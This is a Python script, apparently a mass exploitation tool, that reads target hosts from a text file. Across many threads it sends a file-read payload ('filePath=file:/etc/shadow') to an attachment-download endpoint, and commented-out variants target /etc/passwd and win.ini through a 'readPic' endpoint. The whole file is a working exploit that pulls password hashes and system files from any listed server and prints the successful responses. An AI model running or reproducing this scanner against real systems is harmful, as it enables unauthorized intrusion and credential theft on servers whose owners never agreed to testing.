import requests
import threading
# requests.packages.urllib3.disable_warnings()
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
}

def scan(url: str, poc: str):
    url = url + poc
    try:
        print(url)
        r = requests.get(url, headers=headers, timeout=10,verify=False)
        if r.status_code == 200:
            print("success"+url,r.text )
    except Exception as e:
        print(e)

def process_url(url, poc):
    if "http://" not in url and "https://" not in url:
        url = "http://" + url
    scan(url=url.strip(), poc=poc)

# poc = "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
# poc = "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:C:\Windows\win.ini"
poc="/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/shadow"
with open('a.txt', 'r') as f:
    urls = [url.strip() for url in f.readlines()]

threads = []
for url in urls:
    t = threading.Thread(target=process_url, args=(url, poc))
    threads.append(t)
    t.start()

for t in threads:
    t.join()